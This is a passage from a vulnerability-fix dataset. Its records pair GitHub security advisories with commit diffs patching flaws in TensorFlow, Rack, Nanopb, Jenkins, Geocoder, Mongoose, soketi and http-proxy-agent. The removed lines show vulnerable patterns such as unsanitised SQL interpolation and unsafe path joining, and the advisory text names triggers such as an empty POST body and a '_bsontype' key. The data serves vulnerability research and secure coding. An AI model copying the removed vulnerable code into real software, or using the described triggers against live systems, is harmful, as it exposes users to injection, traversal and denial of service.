affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b055b9c474cd376259dde8779908f9eeaf097d93","commit_sha":"b055b9c474cd376259dde8779908f9eeaf097d93","patch":"SINGLE","chain_ord":"['b055b9c474cd376259dde8779908f9eeaf097d93']","before_first_fix_commit":"{'904b3926ed1c6c70380d5313d282d248a776baa1'}","last_fix_commit":"b055b9c474cd376259dde8779908f9eeaf097d93","chain_ord_pos":1.0,"commit_datetime":"04\/13\/2021, 21:49:50","message":"Fix `tf.raw_ops.RaggedTensorToVariant` invalid resize.\n\nPiperOrigin-RevId: 368299574\nChange-Id: I751c186325aa0bab397928845e790e60c2d90918","author":"Amit Patankar","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'tensorflow\/core\/kernels\/ragged_tensor_to_variant_op.cc': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/b055b9c474cd376259dde8779908f9eeaf097d93\/tensorflow%2Fcore%2Fkernels%2Fragged_tensor_to_variant_op.cc', 'patch': '@@ -159,6 +159,11 @@ class RaggedTensorToVariantOp : public OpKernel {\\n \\n     \/\/ Unbatch the Ragged Tensor and encode the components.\\n     std::vector<RaggedTensorVariant> unbatched_ragged_input;\\n+    auto batched_splits_top_vec =\\n+        batched_ragged_input.splits(0).vec<SPLIT_TYPE>();\\n+    int num_components = batched_splits_top_vec.size() - 1;\\n+    OP_REQUIRES(context, num_components >= 0,\\n+                errors::Internal(\"Invalid split argument.\"));\\n     OP_REQUIRES_OK(context, UnbatchRaggedZerothDim<VALUE_TYPE, SPLIT_TYPE>(\\n                                 batched_ragged_input, &unbatched_ragged_input));'}}","message_norm":"fix `tf.raw_ops.raggedtensortovariant` invalid resize.\n\npiperorigin-revid: 368299574\nchange-id: i751c186325aa0bab397928845e790e60c2d90918","language":"en","entities":"[('fix', 'ACTION', ''), ('368299574', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/ragged_tensor_to_variant_op.cc'])","num_files":1.0},{"index":1139,"vuln_id":"GHSA-85r7-w5mv-c849","cwe_id":"{'CWE-22'}","score":0.0,"chain":"{'https:\/\/github.com\/rack\/rack\/commit\/6f237e4c9fab649d3750482514f0fde76c56ab30'}","dataset":"osv","summary":"Moderate severity vulnerability that affects rack rack\/file.rb (Rack::File) in Rack 1.5.x before 1.5.2 and 1.4.x before 1.4.5 allows attackers to access arbitrary files outside the intended root directory via a crafted PATH_INFO environment variable, probably a directory traversal vulnerability that is remotely exploitable, aka \"symlink path traversals.\"","published_date":"2017-10-24","chain_len":1,"project":"https:\/\/github.com\/rack\/rack","commit_href":"https:\/\/github.com\/rack\/rack\/commit\/6f237e4c9fab649d3750482514f0fde76c56ab30","commit_sha":"6f237e4c9fab649d3750482514f0fde76c56ab30","patch":"SINGLE","chain_ord":"['6f237e4c9fab649d3750482514f0fde76c56ab30']","before_first_fix_commit":"{'0cd7e9aa397f8ebb3b8481d67dbac8b4863a7f07'}","last_fix_commit":"6f237e4c9fab649d3750482514f0fde76c56ab30","chain_ord_pos":1.0,"commit_datetime":"02\/07\/2013, 00:25:22","message":"Prevent symlink path traversals\n\n * Closes CVE-2013-0262","author":"James Tucker","comments":null,"stats":"{'additions': 6, 'deletions': 11, 'total': 17}","files":"{'lib\/rack\/file.rb': {'additions': 6, 'deletions': 11, 'changes': 17, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/rack\/rack\/raw\/6f237e4c9fab649d3750482514f0fde76c56ab30\/lib%2Frack%2Ffile.rb', 'patch': '@@ -41,19 +41,14 @@ def _call(env)\\n       path_info = Utils.unescape(env[\"PATH_INFO\"])\\n       parts = path_info.split SEPS\\n \\n-      parts.inject(0) do |depth, part|\\n-        case part\\n-        when \\'\\', \\'.\\'\\n-          depth\\n-        when \\'..\\'\\n-          return fail(404, \"Not Found\") if depth - 1 < 0\\n-          depth - 1\\n-        else\\n-          depth + 1\\n-        end\\n+      clean = []\\n+\\n+      parts.each do |part|\\n+        next if part.empty? || part == \\'.\\'\\n+        part == \\'..\\' ? clean.pop : clean << part\\n       end\\n \\n-      @path = F.join(@root, *parts)\\n+      @path = F.join(@root, *clean)\\n \\n       available = begin\\n         F.file?(@path) && F.readable?(@path)'}}","message_norm":"prevent symlink path traversals\n\n * closes cve-2013-0262","language":"en","entities":"[('prevent', 'ACTION', ''), ('symlink', 'SECWORD', ''), ('path traversals', 'SECWORD', ''), ('cve-2013-0262', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/rack\/file.rb'])","num_files":1.0},{"index":1141,"vuln_id":"GHSA-85rr-4rh9-hhwh","cwe_id":"{'CWE-119', 'CWE-20'}","score":7.5,"chain":"{'https:\/\/github.com\/nanopb\/nanopb\/commit\/4fe23595732b6f1254cfc11a9b8d6da900b55b0c'}","dataset":"osv","summary":"Memory leak in Nanopb ### Impact\nDecoding specifically formed message can leak memory if dynamic allocation is enabled and an oneof field contains a static submessage that contains a dynamic field, and the message being decoded contains the submessage multiple times. This is rare in normal messages, but it is a concern when untrusted data is parsed.\n\n### Patches\nPreliminary patch is [available on git](https:\/\/github.com\/nanopb\/nanopb\/commit\/edf6dcbffee4d614ac0c2c1b258ab95185bdb6e9) and problem will be patched in versions 0.3.9.7 and 0.4.4 once testing has been completed.\n\n### Workarounds\nFollowing workarounds are available:\n* Set the option `no_unions` for the oneof field. This will generate fields as separate instead of C union, and avoids triggering the problematic code.\n* Set the type of the submessage field inside oneof to `FT_POINTER`. This way the whole submessage will be dynamically allocated and the problematic code is not executed.\n* Use an arena allocator for nanopb, to make sure all memory can be released afterwards.\n\n### References\nBug report: https:\/\/github.com\/nanopb\/nanopb\/issues\/615\n\n### For more information\nIf you have any questions or comments about this advisory, comment on the bug report linked above.","published_date":"2020-11-25","chain_len":1,"project":"https:\/\/github.com\/nanopb\/nanopb","commit_href":"https:\/\/github.com\/nanopb\/nanopb\/commit\/4fe23595732b6f1254cfc11a9b8d6da900b55b0c","commit_sha":"4fe23595732b6f1254cfc11a9b8d6da900b55b0c","patch":"SINGLE","chain_ord":"['4fe23595732b6f1254cfc11a9b8d6da900b55b0c']","before_first_fix_commit":"{'d9d5dfd869aca4d00a81f671b2445fb4cea0352f'}","last_fix_commit":"4fe23595732b6f1254cfc11a9b8d6da900b55b0c","chain_ord_pos":1.0,"commit_datetime":"11\/25\/2020, 09:38:40","message":"Fix memory leak with oneofs and PB_ENABLE_MALLOC (#615)\n\nNanopb would leak memory when all of the following conditions were true:\n- PB_ENABLE_MALLOC is defined at the compile time\n- Message definitions contains an oneof field,\n  the oneof contains a static submessage, and\n  the static submessage contains a pointer field.\n- Data being decoded contains two values for the submessage.\n\nThe logic in pb_release_union_field would detect that the same\nsubmessage occurs twice, and wouldn't release it because keeping\nthe old values is necessary to match the C++ library behavior\nregarding message merges.\n\nBut then decode_static_field() would go to memset() the whole\nsubmessage to zero, because it unconditionally assumed it to\nbe uninitialized memory. This would normally happen when the\ncontents of the union field is switched to a different oneof\nitem, instead of merging with the same one.\n\nThis commit changes it so that the field is memset() only when\n`which_field` contains a different tag.","author":"Petteri Aimonen","comments":null,"stats":"{'additions': 6, 'deletions': 3, 'total': 9}","files":"{'pb_decode.c': {'additions': 6, 'deletions': 3, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/nanopb\/nanopb\/raw\/4fe23595732b6f1254cfc11a9b8d6da900b55b0c\/pb_decode.c', 'patch': '@@ -464,14 +464,17 @@ static bool checkreturn decode_static_field(pb_istream_t *stream, pb_wire_type_t\\n             }\\n \\n         case PB_HTYPE_ONEOF:\\n-            *(pb_size_t*)iter->pSize = iter->pos->tag;\\n-            if (PB_LTYPE(type) == PB_LTYPE_SUBMESSAGE)\\n+            if (PB_LTYPE(type) == PB_LTYPE_SUBMESSAGE &&\\n+                *(pb_size_t*)iter->pSize != iter->pos->tag)\\n             {\\n                 \/* We memset to zero so that any callbacks are set to NULL.\\n-                 * Then set any default values. *\/\\n+                 * This is because the callbacks might otherwise have values\\n+                 * from some other union field. *\/\\n                 memset(iter->pData, 0, iter->pos->data_size);\\n                 pb_message_set_to_defaults((const pb_field_t*)iter->pos->ptr, iter->pData);\\n             }\\n+            *(pb_size_t*)iter->pSize = iter->pos->tag;\\n+\\n             return func(stream, iter->pos, iter->pData);\\n \\n         default:'}}","message_norm":"fix memory leak with oneofs and pb_enable_malloc (#615)\n\nnanopb would leak memory when all of the following conditions were true:\n- pb_enable_malloc is defined at the compile time\n- message definitions contains an oneof field,\n  the oneof contains a static submessage, and\n  the static submessage contains a pointer field.\n- data being decoded contains two values for the submessage.\n\nthe logic in pb_release_union_field would detect that the same\nsubmessage occurs twice, and wouldn't release it because keeping\nthe old values is necessary to match the c++ library behavior\nregarding message merges.\n\nbut then decode_static_field() would go to memset() the whole\nsubmessage to zero, because it unconditionally assumed it to\nbe uninitialized memory. this would normally happen when the\ncontents of the union field is switched to a different oneof\nitem, instead of merging with the same one.\n\nthis commit changes it so that the field is memset() only when\n`which_field` contains a different tag.","language":"en","entities":"[('fix', 'ACTION', ''), ('memory leak', 'SECWORD', ''), ('#615', 'ISSUE', ''), ('leak', 'SECWORD', ''), ('decoded', 'SECWORD', ''), ('decode_static_field', 'SECWORD', ''), ('uninitialized memory', 'SECWORD', ''), ('changes', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['pb_decode.c'])","num_files":1.0},{"index":1143,"vuln_id":"GHSA-85wq-pqhp-hmq6","cwe_id":"{'CWE-352'}","score":8.8,"chain":"{'https:\/\/github.com\/jenkinsci\/jenkins\/commit\/3c5e5ca63d9a1ac1c4087682dc0d426625eafed8', 'https:\/\/github.com\/jenkinsci\/jenkins\/commit\/e69c28e44dae41322112471e1c80f840bde314d4', 'https:\/\/github.com\/jenkinsci\/jenkins\/commit\/23f4809e6c10a221e9d67f2e841536845387b42d'}","dataset":"osv","summary":"Cross-Site Request Forgery in Jenkins Jenkins versions 2.56 and earlier as well as 2.46.1 LTS and earlier are vulnerable to an issue in the Jenkins user database authentication realm: create an account if signup is enabled; or create an account if the victim is an administrator, possibly deleting the existing default admin user in the process and allowing a wide variety of impacts.","published_date":"2022-05-14","chain_len":3,"project":"https:\/\/github.com\/jenkinsci\/jenkins","commit_href":"https:\/\/github.com\/jenkinsci\/jenkins\/commit\/e69c28e44dae41322112471e1c80f840bde314d4","commit_sha":"e69c28e44dae41322112471e1c80f840bde314d4","patch":"MULTI","chain_ord":"['3c5e5ca63d9a1ac1c4087682dc0d426625eafed8', 'e69c28e44dae41322112471e1c80f840bde314d4', '23f4809e6c10a221e9d67f2e841536845387b42d']","before_first_fix_commit":"{'eeb699ed8c2ce937f2b836692b36a98da7bb5622'}","last_fix_commit":"23f4809e6c10a221e9d67f2e841536845387b42d","chain_ord_pos":2.0,"commit_datetime":"04\/01\/2017, 17:41:02","message":"[SECURITY-412] Fix handling of restart\/safeRestart URLs","author":"Daniel Beck","comments":null,"stats":"{'additions': 21, 'deletions': 8, 'total': 29}","files":"{'core\/src\/main\/java\/jenkins\/model\/Jenkins.java': {'additions': 21, 'deletions': 8, 'changes': 29, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jenkinsci\/jenkins\/raw\/e69c28e44dae41322112471e1c80f840bde314d4\/core%2Fsrc%2Fmain%2Fjava%2Fjenkins%2Fmodel%2FJenkins.java', 'patch': '@@ -3367,19 +3367,25 @@ public DirectoryBrowserSupport doUserContent() {\\n      *\\n      * This first replaces \"app\" to {@link HudsonIsRestarting}\\n      *\/\\n-    @CLIMethod(name=\"restart\")\\n-    @RequirePOST\\n     public void doRestart(StaplerRequest req, StaplerResponse rsp) throws IOException, ServletException, RestartNotSupportedException {\\n         checkPermission(ADMINISTER);\\n         if (req != null && req.getMethod().equals(\"GET\")) {\\n             req.getView(this,\"_restart.jelly\").forward(req,rsp);\\n             return;\\n         }\\n \\n-        restart();\\n+        if (req != null && req.getMethod().equals(\"POST\")) {\\n+            restart();\\n+        }\\n \\n-        if (rsp != null) \/\/ null for CLI\\n-            rsp.sendRedirect2(\".\");\\n+        rsp.sendRedirect2(\".\");\\n+    }\\n+\\n+    @CLIMethod(name=\"restart\")\\n+    @Restricted(NoExternalUse.class)\\n+    public void cliRestart() throws RestartNotSupportedException {\\n+        checkPermission(ADMINISTER);\\n+        restart();\\n     }\\n \\n     \/**\\n@@ -3389,18 +3395,25 @@ public void doRestart(StaplerRequest req, StaplerResponse rsp) throws IOExceptio\\n      *\\n      * @since 1.332\\n      *\/\\n-    @CLIMethod(name=\"safe-restart\")\\n-    @RequirePOST\\n     public HttpResponse doSafeRestart(StaplerRequest req) throws IOException, ServletException, RestartNotSupportedException {\\n         checkPermission(ADMINISTER);\\n         if (req != null && req.getMethod().equals(\"GET\"))\\n             return HttpResponses.forwardToView(this,\"_safeRestart.jelly\");\\n \\n-        safeRestart();\\n+        if (req != null && req.getMethod().equals(\"POST\")) {\\n+            safeRestart();\\n+        }\\n \\n         return HttpResponses.redirectToDot();\\n     }\\n \\n+    @CLIMethod(name=\"safe-restart\")\\n+    @Restricted(NoExternalUse.class)\\n+    public void cliSafeRestart() throws RestartNotSupportedException {\\n+        checkPermission(ADMINISTER);\\n+        safeRestart();\\n+    }\\n+\\n     \/**\\n      * Performs a restart.\\n      *\/'}}","message_norm":"[security-412] fix handling of restart\/saferestart urls","language":"en","entities":"[('security-412', 'SECWORD', ''), ('fix', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['core\/src\/main\/java\/jenkins\/model\/Jenkins.java'])","num_files":1.0},{"index":1144,"vuln_id":"GHSA-85wq-pqhp-hmq6","cwe_id":"{'CWE-352'}","score":8.8,"chain":"{'https:\/\/github.com\/jenkinsci\/jenkins\/commit\/3c5e5ca63d9a1ac1c4087682dc0d426625eafed8', 'https:\/\/github.com\/jenkinsci\/jenkins\/commit\/e69c28e44dae41322112471e1c80f840bde314d4', 'https:\/\/github.com\/jenkinsci\/jenkins\/commit\/23f4809e6c10a221e9d67f2e841536845387b42d'}","dataset":"osv","summary":"Cross-Site Request Forgery in Jenkins Jenkins versions 2.56 and earlier as well as 2.46.1 LTS and earlier are vulnerable to an issue in the Jenkins user database authentication realm: create an account if signup is enabled; or create an account if the victim is an administrator, possibly deleting the existing default admin user in the process and allowing a wide variety of impacts.","published_date":"2022-05-14","chain_len":3,"project":"https:\/\/github.com\/jenkinsci\/jenkins","commit_href":"https:\/\/github.com\/jenkinsci\/jenkins\/commit\/23f4809e6c10a221e9d67f2e841536845387b42d","commit_sha":"23f4809e6c10a221e9d67f2e841536845387b42d","patch":"MULTI","chain_ord":"['3c5e5ca63d9a1ac1c4087682dc0d426625eafed8', 'e69c28e44dae41322112471e1c80f840bde314d4', '23f4809e6c10a221e9d67f2e841536845387b42d']","before_first_fix_commit":"{'eeb699ed8c2ce937f2b836692b36a98da7bb5622'}","last_fix_commit":"23f4809e6c10a221e9d67f2e841536845387b42d","chain_ord_pos":3.0,"commit_datetime":"04\/13\/2017, 13:01:32","message":"[SECURITY-412] Simplify implementation as suggested by jglick","author":"Daniel Beck","comments":null,"stats":"{'additions': 4, 'deletions': 16, 'total': 20}","files":"{'core\/src\/main\/java\/jenkins\/model\/Jenkins.java': {'additions': 4, 'deletions': 16, 'changes': 20, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jenkinsci\/jenkins\/raw\/23f4809e6c10a221e9d67f2e841536845387b42d\/core%2Fsrc%2Fmain%2Fjava%2Fjenkins%2Fmodel%2FJenkins.java', 'patch': '@@ -3369,53 +3369,41 @@ public DirectoryBrowserSupport doUserContent() {\\n      *\\n      * This first replaces \"app\" to {@link HudsonIsRestarting}\\n      *\/\\n+    @CLIMethod(name=\"restart\")\\n     public void doRestart(StaplerRequest req, StaplerResponse rsp) throws IOException, ServletException, RestartNotSupportedException {\\n         checkPermission(ADMINISTER);\\n         if (req != null && req.getMethod().equals(\"GET\")) {\\n             req.getView(this,\"_restart.jelly\").forward(req,rsp);\\n             return;\\n         }\\n \\n-        if (req != null && req.getMethod().equals(\"POST\")) {\\n+        if (req == null || req.getMethod().equals(\"POST\")) {\\n             restart();\\n         }\\n \\n         rsp.sendRedirect2(\".\");\\n     }\\n \\n-    @CLIMethod(name=\"restart\")\\n-    @Restricted(NoExternalUse.class)\\n-    public void cliRestart() throws RestartNotSupportedException {\\n-        checkPermission(ADMINISTER);\\n-        restart();\\n-    }\\n-\\n     \/**\\n      * Queues up a restart of Jenkins for when there are no builds running, if we can.\\n      *\\n      * This first replaces \"app\" to {@link HudsonIsRestarting}\\n      *\\n      * @since 1.332\\n      *\/\\n+    @CLIMethod(name=\"safe-restart\")\\n     public HttpResponse doSafeRestart(StaplerRequest req) throws IOException, ServletException, RestartNotSupportedException {\\n         checkPermission(ADMINISTER);\\n         if (req != null && req.getMethod().equals(\"GET\"))\\n             return HttpResponses.forwardToView(this,\"_safeRestart.jelly\");\\n \\n-        if (req != null && req.getMethod().equals(\"POST\")) {\\n+        if (req == null || req.getMethod().equals(\"POST\")) {\\n             safeRestart();\\n         }\\n \\n         return HttpResponses.redirectToDot();\\n     }\\n \\n-    @CLIMethod(name=\"safe-restart\")\\n-    @Restricted(NoExternalUse.class)\\n-    public void cliSafeRestart() throws RestartNotSupportedException {\\n-        checkPermission(ADMINISTER);\\n-        safeRestart();\\n-    }\\n-\\n     \/**\\n      * Performs a restart.\\n      *\/'}}","message_norm":"[security-412] simplify implementation as suggested by jglick","language":"en","entities":"[('security-412', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['core\/src\/main\/java\/jenkins\/model\/Jenkins.java'])","num_files":1.0},{"index":1149,"vuln_id":"GHSA-864j-6qpp-cmrr","cwe_id":"{'CWE-89'}","score":9.8,"chain":"{'https:\/\/github.com\/alexreisner\/geocoder\/commit\/dcdc3d8675411edce3965941a2ca7c441ca48613'}","dataset":"osv","summary":"SQL Injection in Geocoder sql.rb in Geocoder before 1.6.1 allows Boolean-based SQL injection when within_bounding_box is used in conjunction with untrusted sw_lat, sw_lng, ne_lat, or ne_lng data.","published_date":"2020-06-10","chain_len":1,"project":"https:\/\/github.com\/alexreisner\/geocoder","commit_href":"https:\/\/github.com\/alexreisner\/geocoder\/commit\/dcdc3d8675411edce3965941a2ca7c441ca48613","commit_sha":"dcdc3d8675411edce3965941a2ca7c441ca48613","patch":"SINGLE","chain_ord":"['dcdc3d8675411edce3965941a2ca7c441ca48613']","before_first_fix_commit":"{'1ff64c47b6fc21d9c5ce30a6549d9eaa67c81a9e'}","last_fix_commit":"dcdc3d8675411edce3965941a2ca7c441ca48613","chain_ord_pos":1.0,"commit_datetime":"01\/23\/2020, 16:08:45","message":"Sanitize lat\/lon for SQL query.","author":"Alex Reisner","comments":null,"stats":"{'additions': 4, 'deletions': 4, 'total': 8}","files":"{'lib\/geocoder\/sql.rb': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/alexreisner\/geocoder\/raw\/dcdc3d8675411edce3965941a2ca7c441ca48613\/lib%2Fgeocoder%2Fsql.rb', 'patch': '@@ -44,13 +44,13 @@ def approx_distance(latitude, longitude, lat_attr, lon_attr, options = {})\\n     end\\n \\n     def within_bounding_box(sw_lat, sw_lng, ne_lat, ne_lng, lat_attr, lon_attr)\\n-      spans = \"#{lat_attr} BETWEEN #{sw_lat} AND #{ne_lat} AND \"\\n+      spans = \"#{lat_attr} BETWEEN #{sw_lat.to_f} AND #{ne_lat.to_f} AND \"\\n       # handle box that spans 180 longitude\\n       if sw_lng.to_f > ne_lng.to_f\\n-        spans + \"(#{lon_attr} BETWEEN #{sw_lng} AND 180 OR \" +\\n-        \"#{lon_attr} BETWEEN -180 AND #{ne_lng})\"\\n+        spans + \"(#{lon_attr} BETWEEN #{sw_lng.to_f} AND 180 OR \" +\\n+        \"#{lon_attr} BETWEEN -180 AND #{ne_lng.to_f})\"\\n       else\\n-        spans + \"#{lon_attr} BETWEEN #{sw_lng} AND #{ne_lng}\"\\n+        spans + \"#{lon_attr} BETWEEN #{sw_lng.to_f} AND #{ne_lng.to_f}\"\\n       end\\n     end'}}","message_norm":"sanitize lat\/lon for sql query.","language":"fr","entities":"[('sanitize', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/geocoder\/sql.rb'])","num_files":1.0},{"index":1150,"vuln_id":"GHSA-8687-vv9j-hgph","cwe_id":"{'CWE-20'}","score":9.1,"chain":"{'https:\/\/github.com\/Automattic\/mongoose\/commit\/f3eca5b94d822225c04e96cbeed9f095afb3c31c'}","dataset":"osv","summary":"Improper Input Validation in Automattic Mongoose Automattic Mongoose through 5.7.4 allows attackers to bypass access control (in some applications) because any query object with a _bsontype attribute is ignored. For example, adding \"_bsontype\":\"a\" can sometimes interfere with a query filter. NOTE: this CVE is about Mongoose's failure to work around this _bsontype special case that exists in older versions of the bson parser (aka the mongodb\/js-bson project).","published_date":"2019-10-22","chain_len":1,"project":"https:\/\/github.com\/Automattic\/mongoose","commit_href":"https:\/\/github.com\/Automattic\/mongoose\/commit\/f3eca5b94d822225c04e96cbeed9f095afb3c31c","commit_sha":"f3eca5b94d822225c04e96cbeed9f095afb3c31c","patch":"SINGLE","chain_ord":"['f3eca5b94d822225c04e96cbeed9f095afb3c31c']","before_first_fix_commit":"{'cc10e0dc441f469330c1af2822d171fcd6fa8f89'}","last_fix_commit":"f3eca5b94d822225c04e96cbeed9f095afb3c31c","chain_ord_pos":1.0,"commit_datetime":"10\/09\/2019, 22:41:25","message":"fix(query): delete top-level `_bsontype` property in queries to prevent silent empty queries\n\nFix #8222","author":"Valeri Karpov","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'lib\/cast.js': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Automattic\/mongoose\/raw\/f3eca5b94d822225c04e96cbeed9f095afb3c31c\/lib%2Fcast.js', 'patch': \"@@ -27,6 +27,12 @@ module.exports = function cast(schema, obj, options, context) {\\n     throw new Error('Query filter must be an object, got an array ', util.inspect(obj));\\n   }\\n \\n+  \/\/ bson 1.x has the unfortunate tendency to remove filters that have a top-level\\n+  \/\/ `_bsontype` property. Should remove this when we upgrade to bson 4.x. See gh-8222\\n+  if (obj.hasOwnProperty('_bsontype')) {\\n+    delete obj._bsontype;\\n+  }\\n+\\n   const paths = Object.keys(obj);\\n   let i = paths.length;\\n   let _keys;\"}}","message_norm":"fix(query): delete top-level `_bsontype` property in queries to prevent silent empty queries\n\nfix #8222","language":"fr","entities":"[('fix(query', 'ACTION', ''), ('prevent', 'ACTION', ''), ('fix', 'ACTION', ''), ('#8222', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/cast.js'])","num_files":1.0},{"index":1151,"vuln_id":"GHSA-86ch-6w7v-v6xf","cwe_id":"{'CWE-755'}","score":7.5,"chain":"{'https:\/\/github.com\/soketi\/soketi\/commit\/4b12efef9c31117c36a0a0f1c3aa32114e86364b'}","dataset":"osv","summary":"Denial of Service in soketi ### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nThere was a wrong behavior when reading POST requests, making the server crash if it couldn't read the body. In case a POST request was sent to any endpoint of the server with an empty body, **even unauthenticated with the Pusher Protocol**, it would simply just crash the server for trying to send a response after the request closed.\n\nAll users that run the server are affected by it and it's highly recommended to upgrade to the latest patch.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nUpdating to at least 0.24.1 or the latest version.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nNo. Upgrading is the only solution.\n\n### References\n_Are there any links users can visit to find out more?_\n\nhttps:\/\/github.com\/soketi\/soketi\/releases\/tag\/0.24.1\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the issues board](https:\/\/github.com\/soketi\/soketi\/issues)\n* Email us at [alex@renoki.org](mailto:alex@renoki.org)","published_date":"2022-01-08","chain_len":1,"project":"https:\/\/github.com\/soketi\/soketi","commit_href":"https:\/\/github.com\/soketi\/soketi\/commit\/4b12efef9c31117c36a0a0f1c3aa32114e86364b","commit_sha":"4b12efef9c31117c36a0a0f1c3aa32114e86364b","patch":"SINGLE","chain_ord":"['4b12efef9c31117c36a0a0f1c3aa32114e86364b']","before_first_fix_commit":"{'8541e4e07c97de7b6fd2ce22f4e072ef1072d627', '53ba39c7886c614d27633d347dbd93faac9dbdc0'}","last_fix_commit":"4b12efef9c31117c36a0a0f1c3aa32114e86364b","chain_ord_pos":1.0,"commit_datetime":"01\/07\/2022, 11:26:17","message":"Merge pull request #246 from soketi\/fix\/crash-on-empty-post\n\n[fix] Do not close the connection on empty POST payload","author":"rennokki","comments":null,"stats":"{'additions': 9, 'deletions': 7, 'total': 16}","files":"{'src\/http-handler.ts': {'additions': 9, 'deletions': 7, 'changes': 16, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/soketi\/soketi\/raw\/4b12efef9c31117c36a0a0f1c3aa32114e86364b\/src%2Fhttp-handler.ts', 'patch': \"@@ -417,19 +417,22 @@ export class HttpHandler {\\n             let chunk = Buffer.from(ab);\\n \\n             if (isLast) {\\n-                let json;\\n-                let raw;\\n+                let json = {};\\n+                let raw = '{}';\\n \\n                 if (buffer) {\\n                     try {\\n                         \/\/ @ts-ignore\\n                         json = JSON.parse(Buffer.concat([buffer, chunk]));\\n                     } catch (e) {\\n-                        res.close();\\n-                        return;\\n+                        \/\/\\n                     }\\n \\n-                    raw = Buffer.concat([buffer, chunk]).toString();\\n+                    try {\\n+                        raw = Buffer.concat([buffer, chunk]).toString();\\n+                    } catch (e) {\\n+                        \/\/\\n+                    }\\n \\n                     cb(json, raw);\\n                     loggingAction(json);\\n@@ -439,8 +442,7 @@ export class HttpHandler {\\n                         json = JSON.parse(chunk);\\n                         raw = chunk.toString();\\n                     } catch (e) {\\n-                        res.close();\\n-                        return;\\n+                        \/\/\\n                     }\\n \\n                     cb(json, raw);\"}}","message_norm":"merge pull request #246 from soketi\/fix\/crash-on-empty-post\n\n[fix] do not close the connection on empty post payload","language":"en","entities":"[('#246', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/http-handler.ts'])","num_files":1.0},{"index":1158,"vuln_id":"GHSA-86wf-436m-h424","cwe_id":"{'CWE-665'}","score":9.8,"chain":"{'https:\/\/github.com\/TooTallNate\/node-http-proxy-agent\/commit\/b7b7cc793c3226aa83f820ce5c277e81862d32eb'}","dataset":"osv","summary":"Resource Exhaustion Denial of Service in http-proxy-agent  A flaw was found in http-proxy-agent, prior to version 2.1.0. It was discovered http-proxy-agent passes an auth option to the Buffer constructor without proper sanitization. This could result in a Denial of Service through the usage of all available CPU resources and data exposure through an uninitialized memory leak in setups where an attacker could submit typed input to the auth parameter.","published_date":"2022-01-06","chain_len":1,"project":"https:\/\/github.com\/TooTallNate\/node-http-proxy-agent","commit_href":"https:\/\/github.com\/TooTallNate\/node-http-proxy-agent\/commit\/b7b7cc793c3226aa83f820ce5c277e81862d32eb","commit_sha":"b7b7cc793c3226aa83f820ce5c277e81862d32eb","patch":"SINGLE","chain_ord":"['b7b7cc793c3226aa83f820ce5c277e81862d32eb']","before_first_fix_commit":"{'687da671c075cde76be2d3e907d5384c970efadc'}","last_fix_commit":"b7b7cc793c3226aa83f820ce5c277e81862d32eb","chain_ord_pos":1.0,"commit_datetime":"03\/03\/2018, 23:47:26","message":"Use `Buffer.from()`\n\n`new Buffer()` is deprecated and unsafe.","author":"Nathan Rajlich","comments":null,"stats":"{'additions': 5, 'deletions': 3, 'total': 8}","files":"{'index.js': {'additions': 5, 'deletions': 3, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/TooTallNate\/node-http-proxy-agent\/raw\/b7b7cc793c3226aa83f820ce5c277e81862d32eb\/index.js', 'patch': \"@@ -75,9 +75,11 @@ HttpProxyAgent.prototype.callback = function connect (req, opts, fn) {\\n   req.path = absolute;\\n \\n   \/\/ inject the `Proxy-Authorization` header if necessary\\n-  var auth = proxy.auth;\\n-  if (auth) {\\n-    req.setHeader('Proxy-Authorization', 'Basic ' + new Buffer(auth).toString('base64'));\\n+  if (proxy.auth) {\\n+    req.setHeader(\\n+      'Proxy-Authorization',\\n+      'Basic ' + Buffer.from(proxy.auth).toString('base64')\\n+    );\\n   }\\n \\n   \/\/ create a socket connection to the proxy server\"}}","message_norm":"use `buffer.from()`\n\n`new buffer()` is deprecated and unsafe.","language":"en","entities":"[('unsafe', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":1159,"vuln_id":"GHSA-874w-m2v2-mj64","cwe_id":"{'CWE-415'}","score":9.8,"chain":"{'https:\/\/github.com\/adplug\/adplug\/commit\/1a282a486a8e33fef3e15998bf6408d3515dc07e', 'https:\/\/github.com\/miller-alex\/adplug\/commit\/8abb9328bf27dcbdafc67ade3e75af0ffd8f7633'}","dataset":"osv","summary":"Double Free in Adplug AdPlug 2.3.1 has a double free in the Cu6mPlayer class in 